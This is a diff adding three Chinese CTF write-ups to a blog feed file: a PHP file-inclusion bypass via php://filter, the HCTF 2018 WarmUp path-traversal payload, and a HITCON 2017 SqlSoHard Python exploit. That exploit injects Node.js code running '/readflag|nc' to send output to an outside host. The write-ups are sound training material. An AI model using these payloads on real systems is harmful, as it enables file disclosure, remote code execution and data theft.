@@ -4,6 +4,63 @@
   
     
     <entry>
+      <title>极客大挑战:2019-SecretFile</title>
+      <link href="2021/06/09/ji-ke-da-tiao-zhan-2019-secretfile/"/>
+      <url>2021/06/09/ji-ke-da-tiao-zhan-2019-secretfile/</url>
+      
+        <content type="html"><![CDATA[<p>F12</p><p><img src="/2021/06/09/ji-ke-da-tiao-zhan-2019-secretfile/image-20210609211655223.png" alt="image-20210609211655223"></p><pre><code>Archive_room.php</code></pre><p><img src="/2021/06/09/ji-ke-da-tiao-zhan-2019-secretfile/image-20210609211736485.png" alt="image-20210609211736485"></p><p>点中间就会</p><p><img src="/2021/06/09/ji-ke-da-tiao-zhan-2019-secretfile/image-20210609211800847.png" alt="image-20210609211800847"></p><p>burp抓包</p><p><img src="/2021/06/09/ji-ke-da-tiao-zhan-2019-secretfile/image-20210609211856185.png" alt="image-20210609211856185"></p><p>访问这个secret</p><pre><code>&lt;html&gt;    &lt;title&gt;secret&lt;/title&gt;    &lt;meta charset="UTF-8"&gt;&lt;?php    highlight_file(__FILE__);    error_reporting(0);    $file=$_GET['file'];    if(strstr($file,"../")||stristr($file, "tp")||stristr($file,"input")||stristr($file,"data")){        echo "Oh no!";        exit();    }    include($file); //flag放在了flag.php里?&gt;&lt;/html&gt;</code></pre><p>代码审计不能含有”../“，”tp”，”input”，”data”</p><p>所以才有LFI中的base64 encoded构造payload：</p><pre><code>secr3t.php?file=php://filter/read=convert.base64-encode/resource=flag.php</code></pre><pre><code>PCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4KCiAgICA8aGVhZD4KICAgICAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICAgICAgPHRpdGxlPkZMQUc8L3RpdGxlPgogICAgPC9oZWFkPgoKICAgIDxib2R5IHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOmJsYWNrOyI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPGgxIHN0eWxlPSJmb250LWZhbWlseTp2ZXJkYW5hO2NvbG9yOnJlZDt0ZXh0LWFsaWduOmNlbnRlcjsiPuWViuWTiO+8geS9oOaJvuWIsOaIkeS6hu+8geWPr+aYr+S9oOeci+S4jeWIsOaIkVFBUX5+fjwvaDE+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPHAgc3R5bGU9ImZvbnQtZmFtaWx5OmFyaWFsO2NvbG9yOnJlZDtmb250LXNpemU6MjBweDt0ZXh0LWFsaWduOmNlbnRlcjsiPgogICAgICAgICAgICA8P3BocAogICAgICAgICAgICAgICAgZWNobyAi5oiR5bCx5Zyo6L+Z6YeMIjsKICAgICAgICAgICAgICAgICRmbGFnID0gJ2ZsYWd7NTE5ZjkxMjAtMjQ1Mi00MWQ1LThkNDUtZWU0MDRhMGVlZTk0fSc7CiAgICAgICAgICAgICAgICAkc2VjcmV0ID0gJ2ppQW5nX0x1eXVhbl93NG50c19hX2cxcklmcmkzbmQnCiAgICAgICAgICAgID8+CiAgICAgICAgPC9wPgogICAgPC9ib2R5PgoKPC9odG1sPgo=</code></pre><p><img src="/2021/06/09/ji-ke-da-tiao-zhan-2019-secretfile/image-20210609211626525.png" alt="image-20210609211626525"></p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 文件包含 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>HCTF:2018-WarmUp</title>
+      <link href="2021/06/09/hctf-2018-warmup/"/>
+      <url>2021/06/09/hctf-2018-warmup/</url>
+      
+        <content type="html"><![CDATA[<p><img src="/2021/06/09/hctf-2018-warmup/image-20210609162122575.png" alt="image-20210609162122575"></p><pre><code> &lt;?php    highlight_file(__FILE__);    class emmm    {        public static function checkFile(&amp;$page)        {            $whitelist = ["source"=&gt;"source.php","hint"=&gt;"hint.php"];            if (! isset($page) || !is_string($page)) {                echo "you can't see it";                return false;            }            if (in_array($page, $whitelist)) {                return true;            }            $_page = mb_substr(                $page,                0,                mb_strpos($page . '?', '?')            );            if (in_array($_page, $whitelist)) {                return true;            }            $_page = urldecode($page);            $_page = mb_substr(                $_page,                0,                mb_strpos($_page . '?', '?')            );            if (in_array($_page, $whitelist)) {                return true;            }            echo "you can't see it";            return false;        }    }    if (! empty($_REQUEST['file'])        &amp;&amp; is_string($_REQUEST['file'])        &amp;&amp; emmm::checkFile($_REQUEST['file'])    ) {        include $_REQUEST['file'];        exit;    } else {        echo "&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;";    }  ?&gt; </code></pre><p><img src="/2021/06/09/hctf-2018-warmup/image-20210609162411358.png" alt="image-20210609162411358"></p><ul><li><strong>!empty($_REQUEST[‘file’])</strong>:要我们的file变量不为空</li><li><strong>is_string($_REQUEST[‘file’])</strong>:要求我们传进来的值是字符串类型</li><li><strong>emmm::checkFile($_REQUEST[‘file’])</strong>:这里将我们的的值传到emmm类里面的checkFile函数</li><li>**mb_strpos()**：返回要查找的字符串在别一个字符串中首次出现的位置</li><li><strong>mb_substr()</strong>: 函数返回字符串的一部分</li><li>第一个if语句对变量进行检验，要求$page为字符串，否则返回false</li><li>第二个if语句判断$page是否存在于$whitelist数组中，存在则返回true</li><li>第三个if语句判断截取后的$page是否存在于$whitelist数组中，截取$page中’?’前部分，存在则返回true</li><li>第四个if语句判断url解码并截取后的$page是否存在于$whitelist中，存在则返回true<br> 若以上四个if语句均未返回值，则返回false</li></ul><pre><code>index.php?file=hint.php?../../../../../ffffllllaaaagggg</code></pre><p><img src="/2021/06/09/hctf-2018-warmup/image-20210609204113988.png" alt="image-20210609204113988"></p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 代码审计 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>HITCON:2017-SqlSoHard</title>
+      <link href="2021/06/08/hitcon-2017-sqlsohard/"/>
+      <url>2021/06/08/hitcon-2017-sqlsohard/</url>
+      
+        <content type="html"><![CDATA[<p>不是很懂过后再来看</p><pre><code>from random import randintimport requests# payload = "union"payload = """','')/*%s*/returning(1)as"\\'/*",(1)as"\\'*/-(a=`child_process`)/*",(2)as"\\'*/-(b=`/readflag|nc 10.188.2.20 9999`)/*",(3)as"\\'*/-console.log(process.mainModule.require(a).exec(b))]=1//"--""" % (' '*1024*1024*16)username = str(randint(1, 65535))+str(randint(1, 65535))+str(randint(1, 65535))data = {            'username': username+payload,                 'password': 'AAAAAA'                }print('ok')r = requests.post('http://c0eea204-4994-41eb-ada6-e2b515eceae8.node3.buuoj.cn/', data=data);print(r.content)</code></pre><p><img src="/2021/06/08/hitcon-2017-sqlsohard/image-20210609161557645.png" alt="image-20210609161557645"></p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> HITCON </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>HITCON：2017-SSRFme</title>
       <link href="2021/06/08/hitcon-2017-ssrfme/"/>
       <url>2021/06/08/hitcon-2017-ssrfme/</url>
